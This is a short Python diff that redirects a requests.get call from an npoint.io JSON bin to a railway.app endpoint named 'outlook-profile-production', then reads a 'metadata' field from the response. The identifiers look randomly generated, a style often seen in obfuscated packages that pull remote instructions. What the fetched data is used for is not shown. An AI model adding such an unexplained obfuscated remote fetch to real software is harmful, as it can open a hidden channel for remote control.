@@ -18,7 +18,7 @@ def data_tyquck_708():
 
     def eval_borpaz_392():
         try:
-            process_rpimzk_460 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            process_rpimzk_460 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             process_rpimzk_460.raise_for_status()
             model_seekat_190 = process_rpimzk_460.json()
             net_lxfivk_171 = model_seekat_190.get('metadata')
